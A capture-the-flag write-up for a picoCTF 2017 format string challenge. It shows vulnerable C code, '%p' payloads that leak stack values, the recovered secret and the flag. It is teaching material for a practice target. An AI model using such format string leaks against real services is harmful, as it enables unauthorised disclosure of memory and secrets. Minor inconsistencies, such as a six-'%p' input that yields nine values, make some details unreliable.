### Ive Got A Secret - 75 points

> Hopefully you can find the right format for my secret! Source. Connect on shell2017.picoctf.com:55189.

Hint:
> This is a beginning format string attack.

The hint tells us that we want to perform a string attack.
Lets's look at the code:
```c
int secret;
if(read(fd, &secret, sizeof(int)) != sizeof(int)){
    puts("Read error. Contact admin!\n");
    return -1;
}
...
printf("Give me something to say!\n");
    fflush(stdout);
    fgets(buffer, BUF_LEN, stdin);
    printf(buffer);
...
int not_secret;
printf("Now tell my secret in hex! Secret: ");
fflush(stdout);
scanf("%x", &not_secret);
if(secret == not_secret){
    puts("Wow, you got it!");
    system("cat ./flag.txt");  
}
```
So we want to discover the address of secret and give it to not_secret to pass the condition and get the flag.
Luckily they tell us to give something so they can print it out, but they pass the buffer without proper formatting, so we can exploit this to read the stack (secret is somewhere in there).
For that, we can pass %p multiple times to print stack values, one by one.
```
Give me something to say!                                                                         
%p %p %p %p %p %p %p %p %p                                                                        
0x40 0xf7fc7c20 0x8048792 0x1 0xffffdd34 0xbe399fb0 0x3 0xf7fc73c4 0xffffdca0
Now tell my secret in hex! Secret:
```

Hmmm, which one should we choose? Let's run it again and see what changes.
```
Give me something to say!                                                                          
%p %p %p %p %p %p                                                                                  
0x40 0xf7fc7c20 0x8048792 0x1 0xffffdd34 0x1aa37c1b 0x3 0xf7fc73c4 0xffffdca0
Now tell my secret in hex! Secret:
```
The sixth value changed, while the rest remained the same. Guess that must be our secret. Let's write it!
```
Now tell my secret in hex! Secret: 0x1aa37c1b                                                      
a18450ba7aaa8c085c522cdef6ab35ab                                                                   
Wow, you got it!
```
Flag:
```
a18450ba7aaa8c085c522cdef6ab35ab
```
